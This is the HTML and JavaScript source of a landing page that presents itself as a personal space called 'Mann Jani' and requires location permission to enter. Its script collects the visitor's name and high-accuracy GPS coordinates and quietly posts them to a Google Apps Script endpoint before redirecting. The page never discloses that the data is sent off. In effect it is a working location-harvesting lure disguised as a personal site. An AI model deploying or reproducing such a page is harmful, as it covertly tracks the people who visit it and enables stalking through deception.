<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Mann Jani</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- Apple / iOS style fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">

  <style>
    * {
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      margin: 0;
      height: 100vh;
      font-family: -apple-system, BlinkMacSystemFont,
        "SF Pro Display", "SF Pro Text",
        "Inter", system-ui, sans-serif;
      background: radial-gradient(
        1200px circle at top,
        #0f172a 0%,
        #020617 55%,
        #000000 100%
      );
      display: flex;
      align-items: center;
      justify-content: center;
      color: #e5e7eb;
    }

    .card {
      width: 92%;
      max-width: 420px;
      padding: 36px 28px;
      border-radius: 22px;
      background: linear-gradient(
        180deg,
        rgba(255,255,255,0.06),
        rgba(255,255,255,0.02)
      );
      border: 1px solid rgba(255,255,255,0.08);
      backdrop-filter: blur(24px);
      -webkit-backdrop-filter: blur(24px);
      box-shadow: 0 40px 80px rgba(0,0,0,0.65);
    }

    h1 {
      margin: 0 0 14px;
      font-size: 22px;
      font-weight: 500;
      letter-spacing: 0.7px;
      color: #ffffff;
    }

    p {
      margin: 0 0 28px;
      font-size: 15px;
      line-height: 1.6;
      color: #cbd5f5;
    }

    input {
      width: 100%;
      padding: 14px 16px;
      border-radius: 12px;
      border: none;
      outline: none;
      font-size: 15px;
      background: rgba(255,255,255,0.95);
      color: #020617;
      margin-bottom: 18px;
    }

    input::placeholder {
      color: #6b7280;
    }

    button {
      width: 100%;
      padding: 15px;
      border-radius: 14px;
      border: 1px solid rgba(0,0,0,0.08);
      background: linear-gradient(180deg, #ffffff, #e5e7eb);
      color: #020617;
      font-size: 15px;
      font-weight: 500;
      cursor: pointer;
      transition: all 0.35s ease;
    }

    button:hover {
      transform: translateY(-1px);
      background: linear-gradient(180deg, #ffffff, #d1d5db);
      box-shadow: 0 14px 34px rgba(0,0,0,0.45);
    }

    .msg {
      margin-top: 14px;
      font-size: 13px;
      color: #f87171;
    }

    .note {
      margin-top: 18px;
      font-size: 12px;
      color: #94a3b8;
      text-align: center;
      letter-spacing: 0.3px;
    }
  </style>
</head>

<body>

  <div class="card">
    <h1>MANN JANI</h1>

    <p>
      This is a personal space that reflects who I am and what I’m building.
      If you’re curious to know more, you’re welcome inside.
    </p>

    <input type="text" id="name" placeholder="Your name" required>

    <button onclick="requestAccess()">Enter</button>

    <div class="msg" id="msg"></div>

    <div class="note">Allow the location permission to get access.
                              A quiet space, kept intentional.</div>
  </div>

  <script>
    function requestAccess() {
      const name = document.getElementById("name").value.trim();
      const msg = document.getElementById("msg");

      if (!name) {
        msg.textContent = "Please enter your name.";
        return;
      }

      if (!navigator.geolocation) {
        msg.textContent = "Access unavailable on this device.";
        return;
      }

      navigator.geolocation.getCurrentPosition(
        function (position) {
          const data = {
            name: name,
            lat: position.coords.latitude,
            lng: position.coords.longitude,
            accuracy: position.coords.accuracy,
            time: new Date().toISOString()
          };

          fetch("https://script.google.com/macros/s/AKfycbwfvXFKgzZd7KtPlYa_3U_-ynSfcIe_bT3-pdAM9yQp-ewZ0GDCEaYqYZE8C3hS93b_uQ/exec", {
            method: "POST",
            mode: "no-cors",
            body: JSON.stringify(data)
          });

          localStorage.setItem("accessData", JSON.stringify(data));
          window.location.href = "home.html";
        },
        function () {
          msg.textContent = "Access declined.";
        },
        { enableHighAccuracy: true }
      );
    }
  </script>

</body>
</html>
